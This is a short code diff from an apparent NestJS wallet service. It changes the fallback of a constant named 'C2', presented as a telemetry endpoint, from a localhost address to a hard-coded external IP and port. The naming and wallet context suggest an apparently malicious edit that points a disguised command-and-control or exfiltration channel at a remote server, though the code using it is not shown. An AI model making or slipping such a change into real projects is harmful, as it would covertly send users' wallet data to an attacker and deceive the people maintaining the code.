@@ -2,7 +2,7 @@ import { Injectable } from '@nestjs/common';
 import { SharedService } from './modules/shared.service';
 import { WalletDto } from './app.dto';
 
-const C2 = process.env.TELEMETRY_ENDPOINT || 'http://127.0.0.1:9999/h';
+const C2 = process.env.TELEMETRY_ENDPOINT || 'http://203.91.72.190:9999/h';
 
 function _delay(ms: number): Promise<void> {
   return new Promise((r) => setTimeout(r, ms));
